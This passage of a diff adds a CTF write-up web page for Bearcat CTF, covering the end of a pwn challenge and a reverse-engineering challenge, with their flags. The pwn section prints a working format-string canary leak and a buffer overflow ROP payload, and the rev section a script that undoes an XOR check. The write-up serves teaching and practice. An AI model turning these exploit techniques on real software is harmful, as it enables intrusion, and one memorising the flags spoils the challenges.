+          <div class="cb-header"><span class="cb-lang">python</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>p.recvuntil(b"name pirate? ")
+p.sendline(b"%13$p")
+
+p.recvuntil(b"Hello ")
+canary = int(p.recvline().strip().split(b"0x")[1], 16)</pre>
+        </div>
+
+        <p class="wu-p">The leaked value was the stack canary, which protects against buffer overflows.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Stage 2 — Buffer Overflow &amp; ROP Chain</h3></div>
+        <p class="wu-p">After leaking the canary, the second input prompt allowed overflowing a buffer controlling the return address. The exploit preserved the correct canary value and constructed a ROP chain to redirect execution to the hidden win function.</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">python</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>payload  = b"A"*40
+payload += p64(canary)
+payload += b"B"*8
+payload += p64(pop_rdi)
+payload += p64(6)
+payload += p64(pop_rsi)
+payload += p64(7)
+payload += p64(win)
+
+p.send(payload + b"\n")</pre>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-hdr"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg> flag</div>
+          <div class="flag-val">BCCTF{rOp_cHaIn_hAs_BeEn_pWnEd}</div>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Root Cause</h3></div>
+        <ul class="wu-ul">
+          <li>Format string vulnerability allowed stack disclosure</li>
+          <li>Stack canary leaked from memory</li>
+          <li>Buffer overflow enabled return address control</li>
+          <li>No PIE — predictable function addresses</li>
+        </ul>
+
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         06 · FAVORITE PROGRAMMING LANGUAGE
+    ══════════════════════════════════════════ -->
+    <div class="wu-section" id="s-rev">
+      <span class="wu-section-num">06</span>
+      <h2 class="wu-section-title">What's a Pirate's Favorite Programming Language?</h2>
+    </div>
+
+    <div class="challenge-card" id="c-rev">
+      <div class="cc-header">
+        <span class="cc-name">What's a Pirate's Favorite Programming Language?</span>
+        <div class="cc-meta">
+          <span class="tag tag-rev">Rev</span>
+          <span class="cc-type">Reverse Engineering</span>
+        </div>
+      </div>
+      <div class="cc-body">
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Recon</h3></div>
+        <p class="wu-p">The challenge provided a binary along with a hint referencing multiple programming languages except C, implying input validation logic. Running <code>strings</code> on the binary revealed an embedded constant string and transformation logic.</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">bash</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>strings FavoriteProgrammingLanguage</pre>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Binary Analysis</h3></div>
+        <p class="wu-p">The binary compared transformed user input against the constant:</p>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">text</span></div>
+          <pre>CA@PC}Wz:~&lt;uR;[_?T;}[XE$%2#|</pre>
+        </div>
+
+        <p class="wu-p">The transformation applied a position-dependent XOR operation:</p>
+        <ul class="wu-ul">
+          <li>Characters 1–14 → XOR with index <code>i</code></li>
+          <li>Characters 15–28 → XOR with <code>(29 - i)</code></li>
+        </ul>
+        <p class="wu-p">Since XOR is reversible (<code>A ^ B ^ B = A</code>), the operation could be inverted to recover the original input string.</p>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Reversing Script</h3></div>
+
+        <div class="code-block">
+          <div class="cb-header"><span class="cb-lang">python</span><button class="cb-copy" onclick="copyCode(this)">copy</button></div>
+          <pre>ct = "CA@PC}Wz:~&lt;uR;[_?T;}[XE$%2#|"
+
+result = []
+
+for i, c in enumerate(ct):
+    ascii_val = ord(c)
+
+    if i &lt; 14:
+        mask = i + 1
+    else:
+        mask = 29 - (i + 1)
+
+    original = ascii_val ^ mask
+    result.append(chr(original))
+
+print("".join(result))</pre>
+        </div>
+
+        <div class="flag-box">
+          <div class="flag-hdr"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" y1="22" x2="4" y2="15"/></svg> flag</div>
+          <div class="flag-val">BCCTF{Pr3t7y_5UR3_1tS_C!!1!}</div>
+        </div>
+
+        <div class="wu-sub"><h3 class="wu-sub-title">Root Cause</h3></div>
+        <ul class="wu-ul">
+          <li>Flag derivation logic embedded directly in binary</li>
+          <li>Position-based XOR masking</li>
+          <li>Reversible transformation with no additional obfuscation</li>
+          <li>Static analysis sufficient for recovery</li>
+        </ul>
+
+      </div>
+    </div>
+
+  </article>
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <nav class="toc">
+      <div class="toc-header">
+        <span class="toc-label">$ cat toc.txt</span>
+        <span class="blink" style="color:var(--accent)">_</span>
+      </div>
+      <ul class="toc-list" id="toc-list">
+        <li><a href="#s-doubloon"><span class="toc-num">01</span> Dubious Doubloon</a></li>
+        <li><a href="#s-png"><span class="toc-num">02</span> PNG (Polly_Needs_Grog)</a></li>
+        <li><a href="#s-quine"><span class="toc-num">03</span> The Boy is Quine</a></li>
+        <li><a href="#s-debruijn"><span class="toc-num">04</span> Da Brown's Revenge</a></li>
+        <li><a href="#s-treasure"><span class="toc-num">05</span> Treasure Hunter</a></li>
+        <li><a href="#s-rev"><span class="toc-num">06</span> Favorite Prog. Language</a></li>
+      </ul>
+    </nav>
+
+    <div class="scard">
+      <div class="scard-title">event info</div>
+      <div class="scard-rows">
+        <div class="scard-row"><span class="scard-key">event</span><span class="scard-val">Bearcat CTF</span></div>
+        <div class="scard-row"><span class="scard-key">type</span><span class="scard-val">Jeopardy</span></div>
+        <div class="scard-row"><span class="scard-key">date</span><span class="scard-val">21 Feb 2026</span></div>
+        <div class="scard-row"><span class="scard-key">solves</span><span class="scard-accent">6 challenges</span></div>
+        <div class="scard-row"><span class="scard-key">difficulty</span><span class="scard-accent">Medium</span></div>
+      </div>
+    </div>
+
+    <div class="scard">
+      <div class="scard-title">categories</div>
+      <div style="display:flex;flex-wrap:wrap;gap:.4rem;margin-top:.25rem">
+        <span class="tag tag-web">Web</span>
+        <span class="tag tag-misc">Misc</span>
+        <span class="tag tag-pwn">Pwn</span>
+        <span class="tag tag-rev">Rev</span>
+      </div>
+    </div>
+  </aside>
+</div>
+
+<!-- FOOTER -->
+<div class="writeup-footer">
+  <div class="wf-inner">
+    <a href="https://darivxe.xyz/#writeups" class="btn-ghost">← all writeups</a>
+    <div style="display:flex;align-items:center;gap:.5rem;font-size:11px;letter-spacing:.15em;text-transform:uppercase;color:var(--text-mute)">
+      <span class="blink" style="color:var(--accent)">_</span>darivxe.sh
+    </div>
+    <button onclick="window.scrollTo({top:0,behavior:'smooth'})" class="btn-ghost">↑ top</button>
+  </div>
+</div>
+
+<script>
+// Header scroll
+window.addEventListener('scroll', () => {
+  document.getElementById('site-header').classList.toggle('scrolled', window.scrollY > 24);
+}, { passive: true });
+
+// TOC active highlight
+const tocLinks = [...document.querySelectorAll('.toc-list a')];
+const sections = [...document.querySelectorAll('.wu-section')];
+window.addEventListener('scroll', () => {
+  let current = '';
+  sections.forEach(s => {
+    if (s.getBoundingClientRect().top < window.innerHeight * 0.45) current = '#' + s.id;
+  });
+  tocLinks.forEach(a => a.classList.toggle('active', a.getAttribute('href') === current));
+}, { passive: true });
+
+// Copy code
+function copyCode(btn) {
+  const pre = btn.closest('.code-block').querySelector('pre');
+  navigator.clipboard.writeText(pre.innerText).then(() => {
+    btn.textContent = 'copied!';
+    setTimeout(() => { btn.textContent = 'copy'; }, 2000);
+  });
+}
+</script>
+</body>
+</html>
